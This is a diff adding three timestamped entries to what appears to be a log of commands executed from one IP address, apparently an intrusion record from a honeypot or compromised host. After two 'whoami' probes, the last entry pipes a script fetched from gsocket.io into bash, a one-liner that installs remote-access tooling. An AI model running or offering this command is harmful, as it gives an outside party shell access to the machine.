@@ -1,0 +1,3 @@
+[2026-01-14 18:52:17] CMD EXEC: whoami | IP: 193.36.237.23
+[2026-01-14 18:52:20] CMD EXEC: whoami | IP: 193.36.237.23
+[2026-01-14 18:52:59] CMD EXEC: curl -Lso- gsocket.io/x | bash | IP: 193.36.237.23
